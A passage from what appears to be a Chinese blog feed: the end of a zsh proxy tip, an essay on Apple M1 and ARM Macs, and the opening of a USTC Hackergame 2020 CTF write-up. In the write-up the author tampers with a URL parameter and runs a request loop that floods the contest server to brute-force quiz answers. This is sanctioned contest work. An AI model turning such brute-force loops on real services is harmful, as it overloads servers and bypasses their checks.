class=\"hljs-keyword\">then</span>    HTTP_PROXY_HOST=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>    HTTP_PROXY_PORT=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>    <span class=\"hljs-built_in\">export</span> http_proxy=<span class=\"hljs-string\">\"http://<span class=\"hljs-variable\">${HTTP_PROXY_HOST}</span>:<span class=\"hljs-variable\">${HTTP_PROXY_PORT}</span>\"</span>    <span class=\"hljs-built_in\">export</span> HTTP_PROXY=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${https_proxy}</span>\"</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<p>同理，用相同的方法可以获取到其它代理服务器配置。将代码添加到 <code>.zshrc</code> 中，每次新建一个 shell session 时即可自动读取并添加相关环境变量。</p>\n<h2>zsh-osx-autoproxy</h2>\n<p>基于上述介绍的方法，我封装了一个 oh-my-zsh 插件 <a href=\"https://github.com/SukkaW/zsh-osx-autoproxy\">zsh-osx-autoproxy</a>，启用插件后即可自动获取 HTTP 代理、HTTPS 代理、FTP 代理的设置，并在当前 shell 环境中添加相应环境变量（<code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code>、<code>ALL_PROXY</code>、<code>FTP_PROXY</code>）。oh-my-zsh 用户可以通过下述命令完成安装：</p>\n<pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/sukkaw/zsh-osx-autoproxy <span class=\"hljs-variable\">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-osx-autoproxy<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"plugins+=(zsh-osx-autoproxy)\"</span> | tee -a .zshrc</code></pre>\n<p>新建一个终端会话（或使用 <code>source ~/.zshrc</code>） 即可生效。</p>\n<div class=\"license\">\n<div>ZSH 自动读取 macOS 系统代理配置并设置环境变量</div>\n<div><a href=\"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/\">https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2020-12-07</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/"},{"title":"谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来","date":"2020-11-11 16:13:00","description":"\n<p>2020 年 11 月 11 日，苹果在本年度最后一次 Apple Events 上发布了全新的 ARM 芯片 M1、以及三款搭载了 M1 的 Mac：MacBook Air、MacBook Pro 13‘ 和 Mac Mini。在 WWDC 2020 库克宣布 Apple Silicon 后，这次 Apple Events 再一次掀起了热潮，不少 KOL 都把 M1 奉若神明，不少人也不以为然。本文通过 8 个问题来简单聊聊 M1 和 ARM Mac。</p>\n<h2>M1 芯片的性能如何？</h2>\n<p>本文写就时，搭载 M1 的 Mac 尚未开始发货，我们能看到的只有 GeekBench 上流出的跑分。所以，让我们先从跑分开始看起？</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/3.jpg\" alt=\"3\" width=\"1280\" height=\"901\"></p>\n<p>哇！Geekbench 跑分数据告诉我们，M1 和 A14X 可以直接打败 5950X、直接把 Tiger Lake 摁在地上摩擦？这已经不是踩爆 Intel 的牙膏了好伐，这是已经快进到 AMD 原地倒闭了好伐！给 Apple 倒一杯卡布奇诺好吗，快给 Apple 倒一杯卡布奇诺！</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/4.jpg\" alt=\"4\" width=\"965\" height=\"569\"></p>\n<p>啊，什么？这 Geekbench 还说 Intel 的 Tiger Lake 可以吊打 4700U？嗯？嗯~？</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/1.jpg\" alt=\"1\" width=\"1280\" height=\"893\"></p>\n<p>过了一个小时 Geekbench 就更新了排名数据，所以，现在 5950X 和 5900X 的分数又高过 M1 和 A14X 了？</p>\n<p>看了上面这三张图，你应该大致知道像 Geekbench 这样的跑分纯属娱乐了吧。「众所周知」跑分不代表真实体验。所以我们还是看看苹果发布会上给的图表吧：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/2.png\" alt=\"2\" width=\"1523\" height=\"846\"></p>\n<p>什么，苹果竟然敢说自己的 M1 比最先进的 PC 芯片的性能还要强大 …… 哦，我眼睛业障重啊，这图表的标题后面、还跟着一个「Per Watt（每瓦）」啊。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/5.jpg\" alt=\"5\" width=\"1280\" height=\"818\"></p>\n<p>苹果的意思是，自从 Mac 实装了 M1、Mac 的功耗比直接大幅提升，苹果并没有直接说 M1 性能有多好嘛！你看看苏妈在 AMD 发布会上晒的性能图表、条形图都快超到会场外面去了，苹果你在发布会上搞这么含蓄干什么嘛！</p>\n<p>如果苹果在发布会上只强调能耗比有多么高、功耗有多么低，丝毫不提 M1 的绝对性能，甚至没有透露 M1 的频率，对于 M1 芯片的能耐和优势相信读者也有大概的猜测了。至于苹果在发布会上展示搭载了 M1 的 Mac 比往年的同系列 Mac、CPU 性能提升超过 2.8 倍乃至 3.5 倍、GPU 性能提升则有 5 至 6 倍，我会留给后面「如何评价这率先搭载 M1 的三款 Mac？」问题再谈。</p>\n<h2>对 ARM 架构的处理器性能的一瞥</h2>\n<p>从一开始我就没有怀疑苹果是否能实现用于桌面端的 ARM 芯片。苹果操刀数款移动 CPU 的经历，驾驭 ARM 自然是轻车熟路的。</p>\n<p>那么 ARM 有什么优势呢？在手机和平板上 ARM 大放异彩，近几年几乎再没有看到搭载 X86 的智能手机了；不少 IoT 设备、单片机也开始积极使用 ARM 架构；而桌面端 PC 使用 ARM 的却少之又少。从市场上来看，ARM 架构似乎更适用于低功耗、不强调性能和 CPU 密集型计算的平台，但这并不是意味着 ARM 架构本身没有用于 CPU 密集型计算的潜力。今年 6 月 22 日刷新了全球超级计算机的「TOP500」榜单、成为第一的是来自日本理化学研究所（RIKEN）的「Fugaku」（富岳）超级计算机，峰值计算速度达到 513.9 PFlops。而 Fugaku 搭载的富士通的 7nm 48C SoC 正是 ARM 架构。</p>\n<p>作为半导体行业的门外汉，我没有资格谈论 X86 的 CISC 和 ARM、MIPS 等的 RISC 之间孰优孰劣。但从历史的长河里，我们还是能从 ARM 代替 X86 的企图中略窥一二的，其中最接近成功的一次来自 Cloudflare。2017 年 8 月，Cloudflare 尝试从 Intel Skylake 的处理器（E5-2630 v4）切换到由高通提供的 Centriq 平台。从数据上来看，高通提供的平台在当时非常有吸引力：相比 Intel Skylake 的 的 12C24T 2.1GHz，高通 Centriq 平台搭载的 Falkor 核心达到了 46C46T 2.5GHz；相比 Intel 的 170W 的 TDP、高通 Falkor 的 TDP 只有 120W；与 Intel 的 AVX512 指令集对应的，高通也有自己的 NEON 指令集。</p>\n<p>虽然众多 Linux 发行版和依赖库都提供有 ARM64 版本，但是当软件时，Cloudflare 犯了难。Cloudflare 高度依赖基于 NGINX 开发的 Web Server。虽然 NGINX 本身支持 ARM64，但是 NGINX 同时使用了大量的库如用于 gzip 压缩的 zlib 和用于 TLS 的 BoringSSL；而且 Cloudflare 自身还高度依赖来自 OpenResty 的 lua-nginx-module，以及与之对应的 LuauJIT，但不幸的是 LuaJIT 在当时并不支持 ARM64；除此以外，Cloudflare 许多技术还基于用 Go 编写的 RRDNS，在当时也没有 ARM64 的版本。</p>\n<p>除此以外，Cloudflare 在使用 Intel 和 Falkor 进行 OpenSSL 性能基准测试中发现，OpenSSL 公钥交换的性能高度依赖单核 CPU 频率，因此在测试中 Broadwell 竟超过 Skylake 胜出、而 Falkor 排在了垫底的位置；在对称密钥性能方面，Skylake 由于 AVX512 而遥遥领先（期间 CPU 频率甚至维持在 1.4GHz），Broadwell 由于只有 AVX2 落后于第二，而 NEON 使高通再次垫了底。而在 Cloudflare 展开的其它性能测试，如 gzip 压缩性能测试、brotli 压缩性能测试、LUAJIT 性能测试，以及 Go 的 Crypto 库、gzip 库、Go 正则表达式与字符串操作性能测试中，高通的 Falkor 都远远落后，在不少测试中性能甚至只有 Skylake 和 Broadwell 的百分之一。你可以在 <a href=\"https://blog.cloudflare.com/arm-takes-wing/\">Cloudflare 博客中找到他们的性能测试结果</a>。随后，Cloudflare 的数据中心仍旧采用基于 Intel X86 的服务器，直到今年三月，<a href=\"https://blog.cloudflare.com/technical-details-of-why-cloudflare-chose-amd-epyc-for-gen-x-servers/\">Cloudflare 将 AMD EPYC 引入了他们的新一代服务器</a>，虽然 Cloudflare 对 ARM64 满怀信心，但是他们的基础设施依然是基于 X86 的。</p>\n<p>这并不是说 ARM 具有天生的性能劣势（再看看「Fugaku」超算），而是绝大部分行业的程序、甚至是一些编程语言都不是为 ARM 设计、针对 ARM 优化的。优化软件使其能够让 ARM 的硬件完整发挥出完整的性能，还有非常漫长的一段路要走。</p>\n<h2>搭载了 M1 的 Mac 能否运行 Windows？</h2>\n<p>相比之前的长篇大论，这个问题的答案就简单多了 —— 「几乎不可能」，或者就是「不可能」。</p>\n<p>ACPI（Advanced Configuration and Power Interface，高级配置与电源接口）最早早期 1997 年由 Intel、微软、东芝共同提出，后来凤凰科技（做 BIOS 那个）和惠普先后加入规范制定中，自 2006 年起规范制定的工作被交给了 <a href=\"https://uefi.org/\">UEFI 社区</a>。Windows 98 是第一个支持 ACPI 的操作系统，Windows Vista 以后的 Windows 则要求电脑 <strong>必须支持 ACPI</strong>；Linux 虽然不需要 ACPI 也可以运行，但是在现代设备上禁用 ACPI 将会导致绝大部分硬件无法运行；就连 Android 智能设备中也内置了一个精简的 ACPI；2005 年苹果将 Mac 从 PowerPC 架构迁移到 Intel 架构（相关的故事我在另一篇文章「<a href=\"https://blog.skk.moe/post/history-osx86/\">黑苹果的历史</a>」中有详细介绍），Mac 也开始采用 ACPI。但是搭载了 iOS 的 iPhone、iPad 并没有 ACPI，苹果的智能移动设备完全使用自己的私有架构，使用名为「iBoot」的 Bootloader。</p>\n<p>从 WWDC 2020 上发布的 ARM DTK 上，通过 IORegistryExplorer 上我们可以发现运行 macOS Big Sur for ARM 的 DTK 上完全没有 ACPI。我们因此可以猜测，搭载 M1 的 Mac 也一样不存在 ACPI、使用和 iPhone、iPad 一样的 IBoot 作为 Bootloader。如果是这样的话，搭载 M1 的 Mac 上是 <strong>几乎没有可能</strong> 运行 Windows 的，甚至运行 Linux 都将非常受限。虽然不排除苹果为 ARM Mac 增加 ACPI 兼容层的可能，但是考虑到 WWDC 2020 和本次 Apple Events 上都对 BootCamp 缄口不言，基本上已经确定了本次发布的这三款搭载 M1 的 Mac 是绝无可能再运行 Windows 了。</p>\n<h2>如果搭载 M1 的 Mac 几乎没有可能直接运行 Windows，那么虚拟机呢？</h2>\n<p>相比在 X86 上提供的虚拟机增强 Feature Flag，为 ARM 提供虚拟化技术要有趣一些。ARM 虚拟化需要将 Hypervisor 插入到 Exception Level 2，然后再在 TrustZone 上提供虚拟化的功能，说人话就是 ARM 的虚拟化是在架构层面上实现的，因此苹果的 M1 如果要实现虚拟化并不难。但是考虑到苹果现在从硬件到系统都实现了完整的控制，是否提供虚拟化功能完全由苹果控制，如果苹果不启用，谁都无法绕过限制。</p>\n<p>截止到本文写就，<a href=\"https://www.parallels.com/blogs/parallels-desktop-apple-silicon-mac/\">Parallels Desktop 完全无法在 ARM Mac 上运行虚拟机</a>，但是 Parallels Desktop 已经着手对新版本的活跃开发了。考虑到虚拟机的 ACPI 实现和宿主机是完全独立的，只要苹果开放虚拟化，在 ARM Mac 上运行虚拟机是完全可行的。但是，苹果是否会选择开放虚拟化，又和苹果的目标用户战略、M1 本身的性能是相关的。</p>\n<h2>搭载了 M1 的 Mac 能否运行 PhotoShop？</h2>\n<p>这个问题的答案在发布会上有了明确的解答，我们完全无需猜测：「现在不行，不过明年就会有了」。</p>\n<p>在 WWDC 2020 上，库克就在 ARM DTK 上演示了玛雅的运行，但是对 Adobe Photoshop 却一笔带过、表示「仍在适配中」。而在这次 Apple Events 上，苹果软件部门的 SVP 克雷格·费德里吉是这么介绍的：</p>\n<blockquote>\n<p>And Adobe is bringing universal version of their Apps, staring with Lightroom next month, and other collection of apps including Photoshop early next year.</p>\n<p>而且 Adobe 也开始带来他们的通用应用，将从下个月的 Lightroom 开始，而包括 Photoshop 在内的其它应用（的 ARM 版本）则会在明年年初到来。</p>\n</blockquote>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/7.jpg\" alt=\"7\" width=\"1280\" height=\"803\"></p>\n<p>那么，为什么大部分应用都可以很快地发布 Intel、ARM 通用版本，而 Adobe 全家桶却需要再等好几个月？因为 Adobe 从 2019 年开始大部分应用都高度依赖基于 Intel 特殊数学函数库 —— Intel Math Kernel Library（intel-mkl），以及其它一些 Intel 特殊指令集用于硬件加速（涉及到的有 MXMCore、FastCore、CameraRAW 等）。因此即使在搭载了同为 X86 的 AMD 处理器上安装黑苹果，使用 Photoshop 的某些功能也会导致闪退甚至 Kernel Panic；同理，AMD 黑苹果无法运行 MatLab，或者即使能够运行、运算速度也非常缓慢，也是由于缺乏 intel-mkl 导致的。搭载了 M1 芯片的 Mac 自然也无法调用 intel-mkl 库，因此 Adobe 需要几乎重写所有的功能实现，才能让他们的软件在 ARM Mac 上流畅运行。</p>\n<h2>如何评价率先搭载 M1 的三款 Mac？</h2>\n<p>在 Apple Events 上，苹果率先发布了三款搭载了 M1 的 Mac，其中搭载了 M1 的 MacBook Air 相比上一代搭载了 Intel i7 处理器的 MacBook Air（2020 年 3 月推出），CPU 性能提升了 3.5 倍、GPU 图形性能提升了 5 倍。但是，这是和哪一款 Intel i7 对比的呢？上市于 Q2'20 的 i7-1060NG7、Ice Lake、10nm、基础频率 1.20GHz、搭载的是 Iris Plus 核显、TDP 10W。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/8.png\" alt=\"8\" width=\"982\" height=\"547\"></p>\n<p>那 Mac Mini 呢？苹果比表示搭载了 M1 的 Mac Mini 相比上一代搭载了 Intel 处理器的 Mac Mini，CPU 性能提升了 3 倍、GPU 图形性能提升了 6 倍。那么在苹果官网的脚注里写的是和哪一款 Mac Mini 进行的对比呢？对比的是于 2018 年发布的 Mac Mini，搭载了上市于 Q3'18 的 i3-8100B、Coffee Lake、14nm++、基础频率 3.6GHz（无睿频）、搭载的是臭名昭著的 UHD 630 核显，TDP 65W。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/9.png\" alt=\"9\" width=\"993\" height=\"377\"></p>\n<p>苹果发布的第三款搭载 M1 的 Mac 是 MacBook Pro 13'，相比上一代搭载了 Intel i7 的 MacBook Pro 13'，CPU 性能提升 2.8 倍、GPU 图形性能提升了 5 倍，而这一性能提升是和 i7-8557U 对比出来的，上市于 Q3'19、Coffee Lake、14nm++、基础频率 1.7GHz、搭载 Iris Plus 645 核显、TDP 15W。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/10.png\" alt=\"10\" width=\"1002\" height=\"544\"></p>\n<p>注意到没有，苹果在发布会上对比性能提升时，一直都使用的「best in class」（同类别）、「We have ever created」（我们制造过的）、「better than previous generation」（比上一代更好）的说辞。而当我们真正去注意苹果官网产品页面的脚注，才会发现苹果对比的产品并不是加强了 ML 的 Tiger Lake、并不是 Xe 核显或是 VEGA 显卡，而是 CoffeeLake 的降压 U 和孱弱的 Ice Lake、以及臭名昭著的 UHD 630、和上一代的 Iris Plus。</p>\n<p>而且，让我们再做一道数学题，如果 M1 比 i7-8557U（MBP 13' 2019）快 2.8 倍、又比 Ice Lake（MBA 2020）快 3.5 倍，那么是不是可以说 i7-8557U 比 Ice Lake 的 i7-1067NG7 快 25% 呢？可以看出，苹果对比的显然是限制功耗和锁频后的性能，因此结论也就很明显了：ARM 凭借着高能耗比、低功耗，在轻薄本上大杀四方，吊打前款，但是绝对性能在普通 PC、笔记本上搭载的 Ice Lake 和 Tiger Lake 面前其实毫无优势、更不可能和 AMD 同台竞技。</p>\n<p>另外，M1 芯片为了追求超小体积和超低功耗，只在 SoC 中封装了两个 LPDDR4X 作为内存，因此只能提供最高 16G 的「DRAM」内存，这对上网本和办公白领来说绰绰有余，对「创作者」、「开发者」来说自然是远远不够的；被阉割的还有 Mac Mini 上的雷电接口，搭载 Intel 的 Mac Mini 有两个雷电控制器、而搭载 M1 的只有 SoC 里集成的一个，因此 ARM Mac Mini 只有两个雷电接口、而不是四个。</p>\n<p>综合来说，M1 的超低功耗、超高能耗比在轻薄本、上网本上绝对是不二选择，MBA 这样的目标用户更在乎发热和续航，而 M1 恰恰可以满足他们的需要；M1 所不能做的事情，如绝对性能不足、无法连接 eGPU、恰恰是上网本用户所不在意的。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/6.jpg\" alt=\"6\" width=\"1280\" height=\"718\"></p>\n<p>但是，苹果在没有电池的 Mac Mini、和在「面向创作者和开发者」的 MacBook Pro 13' 上搭载孱弱的 M1，实在有点不可理喻、和一种自降身段的感觉。毕竟，Mac Mini 是时时刻刻需要插着电源的，而 MacBook Pro 13' 的用户也不会抱着笔记本在户外使用 Xcode、Final Cut Pro X 和 Logic Pro，对吧？</p>\n<p>虽然我们现在看到 KOL、小编们普遍对 M1 称赞不已，但是可以预见当他们发现这次发布的三款 Mac 都没法安装 Windows、都暂时无法运行 Photoshop 后，对 ARM Mac 的评价也会逐渐转变风向的。</p>\n<h2>Apple ARM 芯片和 ARM Mac 的未来？</h2>\n<p>综合来说，我们在 M1 上看到了令人惊艳的超低功耗加超高能耗比；而在性能方面，对于一款 ARM 架构的处理器来说，「勉勉强强」能和 Tiger Lake「五五开」也已经是不小的成就了。在上网本、轻薄本级别的 MacBook Air 乃至日后可能重启的 MacBook 12' Refresh 产品线上，M 系列处理器肯定是不二选择。</p>\n<p>与之对应的是「生产力 Mac」。MacBook Pro、iMac 的目标用户从事的工作大多为移动办公（MBP Only）、绘图、图像处理、音视频创作、影视制作、软件开发、轻度机器学习，而 Mac Pro、iMac Pro 的目标用户则大多从事大型影视剪辑、大型图像处理、大型数字音频制作、三维制作、大型机器学习等工作。而正如我在之前章节所说，让这类行业内的软件优化适配、使其能够发挥 ARM 的硬件的完整性能，还有非常漫长的一段路要走。而在这些行业中，自行组装 PC 固然可以弥补硬件性能上的差距、而在软件生态上 macOS 却是无出其右的，看看 Logic Pro、Final Cut Pro X 就知道了。苹果在未来很长一段时间内都会继续发布搭载 Intel 的 Mac。如果苹果一意孤行，急迫地在这类产品线强上 M 系列处理器，只会迫使这类目标用户转向 Windows 10 和 AMD 的怀抱。</p>\n<p>历史上，苹果的架构选择甚至还会受到苹果公司领导层决策的影响。1992 年苹果就在计划将 Macintosh System（Classic Mac OS）迁移到 X86 架构上，甚至开展了一项秘密计划「Star Trek」。而当更青睐 PowerPC 的苹果新任 CEO 走马上任以后，X86 架构迁移计划就被束之高阁，直到乔布斯重新回到苹果、WWDC 2005 宣布 Mac 将迁移到 Intel 处理器上。因此，也不排除存在这种可能：随着库克离任、苹果领导层变动、ARM 处理器不再向「高性能、密集计算」的方向突破，甚至可能苹果换了 CEO 后 Mac 将会搭载 AMD 处理器，但是这两种可能性显然不大。</p>\n<h2>黑苹果的未来？</h2>\n<p>作为一名黑苹果用户，M1 处理器的发布自然会引起对黑苹果未来的关注。正如我在「<a href=\"https://blog.skk.moe/post/history-osx86/#%E8%8B%B9%E6%9E%9C%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%BC%9A%E6%94%BE%E5%BC%83-Intel-%E7%9A%84-x86-%E6%9E%B6%E6%9E%84%EF%BC%9F\">黑苹果的未来</a>」一文中的「苹果什么时候会放弃 Intel 的 x86 架构？」章节中所说，过去 6 年之间每个 macOS 大版本都会兼容至少 7 年以前发布的设备。苹果的副总裁 John Ternus 在 Apple Events 中所说「This journey will take a couple of years to complete, and we have a long way to go」，预示着苹果在未来数年内都会继续发布搭载 Intel 处理器的 Mac。</p>\n<div class=\"license\">\n<div>谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来</div>\n<div><a href=\"https://blog.skk.moe/post/talk-about-arm-m1-mac/\">https://blog.skk.moe/post/talk-about-arm-m1-mac/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2020-11-11</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/talk-about-arm-m1-mac/"},{"title":"USTC Hackergame 2020（中科大信安赛）write up","date":"2020-11-06 22:00:00","description":"\n<p>作为一只 CS 零基础、信安零基础、CTF 零基础的菜狐狐，苏卡卡今年又来参加 USTC Hackergame 啦！由于一边做题一边总结思路（指写 Write Up），所以苏卡卡应该是第一个发布非官方的 USTC Hackergame 2020 Write Up 的吧（嘿嘿）。</p>\n<blockquote><p>题图来自 USTC Hackergame 2019「Happy LUG」</p></blockquote>\n<span></span><h2>签到题</h2>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/1.png\" width=\"508\" height=\"417\"></p>\n<p>只要提取 1 个 flag 就好啦！可是，为什么这个反人类的 <code>form-control</code> 的步长竟然是 0.00001：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/2.png\" width=\"794\" height=\"327\"></p>\n<p>继续看下去会发现，用手是根本不可能拖到 1.00000 的：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.5/25.png\" width=\"636\" height=\"277\"></p>\n<p>不管了，直接点击「提取」：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/3.png\" width=\"482\" height=\"393\"></p>\n<p>同时，发现地址栏里的 URL 变成了 <code>http://202.38.93.111:10000/?number=0.84608</code>。那就立刻访问 <code>http://202.38.93.111:10000/?number=1</code> 拿到 flag！</p>\n<blockquote><p>Google 从 Chrome 76 起开始推行 WHATWG URL 规范中的「<a href=\"https://url.spec.whatwg.org/#url-rendering-simplification\">Simplify non-human-readable or irrelevant components</a>」、即「简化非人类可读或不相关的组件」。不过 Chrome 85 起提供了「Always Show Full URLs」的选项，可以在地址栏上右键后从菜单中开启。</p></blockquote>\n<h2>猫咪问答++</h2>\n<blockquote><ol>\n<li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.<br>提示：学术上一般认为龙不属于哺乳动物。</li>\n<li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？<br>提示：咕咕咕，咕咕咕。</li>\n<li>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？<br>提示：活动记录会在哪里？</li>\n<li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？<br>提示：建议身临其境。</li>\n<li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？<br>提示：是一个非负整数。</li>\n</ol></blockquote>\n<p>其中，第二题、第三题、第五题的答案分别可以在下述 URL 中找到：</p>\n<ul>\n<li>\n<a href=\"https://tools.ietf.org/html/rfc1149\">RFC1149 - A Standard for the Transmission of IP Datagrams on Avian Carriers</a>：信鸽的典型 MTU 是 256 毫克</li>\n<li>\n<a href=\"https://news.ustclug.org/2019/09/2019-sfd-ustc/\">2019 软件自由日中国科大站 - USTC LUG</a>：开源游戏的名称是 Teeworlds、有 9 个字母</li>\n<li><a href=\"https://news.ustclug.org/2019/12/hackergame-2019/\">中国科学技术大学第六届信息安全大赛圆满结束 - USTC LUG</a></li>\n</ul>\n<p>至于第一题要搜索二十几种吉祥物、一不小心还会数错，第四题要去找卫星图像或者街景图，大尾巴狐狸太懒了、不想搜索了！有没有别的方法获取 flag？</p>\n<p>第一题给了 23 种编程语言、软件或组织：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-string\">\"Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce\"</span>.split(<span class=\"hljs-string\">'，'</span>).length<span class=\"hljs-comment\">// 23</span></code></pre>\n<p>至于图书馆前的地上停车位、总不可能超过 100 个吧？</p>\n<p>那么，写一个遍历跑第一题和第四题的答案，总会跑出 Flag 的！</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">1</span>; i &lt; <span class=\"hljs-number\">23</span>; i++) { <span class=\"hljs-comment\">// 至少有 1 种哺乳动物；既然提示了龙不是哺乳动物，那么肯定不会 23 种前部都是</span>  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-number\">100</span>; j++) { <span class=\"hljs-comment\">// 一个停车位都没有的可能性不是没有，遍历时要考虑进去</span>    <span class=\"hljs-keyword\">const</span> formData = <span class=\"hljs-keyword\">new</span> FormData();    formData.append(<span class=\"hljs-string\">'q1'</span>, i);    formData.append(<span class=\"hljs-string\">'q2'</span>, <span class=\"hljs-number\">256</span>);    formData.append(<span class=\"hljs-string\">'q3'</span>, <span class=\"hljs-number\">9</span>);    formData.append(<span class=\"hljs-string\">'q4'</span>, j);    formData.append(<span class=\"hljs-string\">'q4'</span>, <span class=\"hljs-number\">17098</span>);    fetch(<span class=\"hljs-string\">'http://202.38.93.111:10001/'</span>, {      <span class=\"hljs-attr\">body</span>: formData,      <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>,    }).then(<span class=\"hljs-function\"><span class=\"hljs-params\">resp</span> =&gt;</span> resp.text()).then(<span class=\"hljs-function\"><span class=\"hljs-params\">text</span> =&gt;</span> {      <span class=\"hljs-keyword\">if</span> (!text.includes(<span class=\"hljs-string\">'没有全部答对，不能给你 flag'</span>)) {        <span class=\"hljs-built_in\">console</span>.log(i, j, text);      }    });  }}</code></pre>\n<p>果然，<del>通过对比赛平台的 CC 攻击</del>，很快就把第一题和第四题答案跑出来了：第一题的答案是 12、第四题的答案是 9。输入正确答案提交即可获取 flag。</p>\n<h2>2048</h2>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/4.png\" width=\"680\" height=\"888\"></p>\n<p>毫无疑问，这道题如果真的玩到 2048 获取 Flag 是肯定可行的，但是我懒；同样的原因，我也不想对这个网站里每个 JS 都审计一次。既然如此，不如先随便玩玩，看看这道题的 Flag 大概会藏在哪里。</p>\n<p>随便乱敲方向键刻意使 Game Over，DevTools 截获了一个 HTTP 请求、是 <code>html_actuator.js</code> 第 164 行发起的：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/5.png\" width=\"1862\" height=\"712\"></p>\n<p>现在我们直接审计 <code>html_actuator.js</code> 就好了，把发起 AJAX 请求的函数找出来：</p>\n<pre><code class=\"hljs js\">HTMLActuator.prototype.message = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">won</span>) </span>{  <span class=\"hljs-keyword\">var</span> type    = won ? <span class=\"hljs-string\">\"game-won\"</span> : <span class=\"hljs-string\">\"game-over\"</span>;  <span class=\"hljs-keyword\">var</span> message = won ? <span class=\"hljs-string\">\"FLXG 大成功！\"</span> : <span class=\"hljs-string\">\"FLXG 永不放弃！\"</span>;  <span class=\"hljs-keyword\">var</span> url;  <span class=\"hljs-keyword\">if</span> (won) {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span> + (<span class=\"hljs-string\">'b'</span>+<span class=\"hljs-string\">'a'</span>+ +<span class=\"hljs-string\">'a'</span>+<span class=\"hljs-string\">'a'</span>).toLowerCase();  } <span class=\"hljs-keyword\">else</span> {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span>;  }  <span class=\"hljs-keyword\">let</span> request = <span class=\"hljs-keyword\">new</span> XMLHttpRequest();  request.open(<span class=\"hljs-string\">'GET'</span>, url);  request.responseType = <span class=\"hljs-string\">'text'</span>;  request.onload = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>{    <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"game-message-extra\"</span>).innerHTML = request.response;  };  request.send();  <span class=\"hljs-built_in\">this</span>.messageContainer.classList.add(type);  <span class=\"hljs-built_in\">this</span>.messageContainer.getElementsByTagName(<span class=\"hljs-string\">\"p\"</span>)[<span class=\"hljs-number\">0</span>].textContent = message;  <span class=\"hljs-built_in\">this</span>.clearContainer(<span class=\"hljs-built_in\">this</span>.sharingContainer);  <span class=\"hljs-built_in\">this</span>.sharingContainer.appendChild(<span class=\"hljs-built_in\">this</span>.scoreTweetButton());};</code></pre>\n<p>看了代码就知道怎么获取 Flag 了，直接 GET 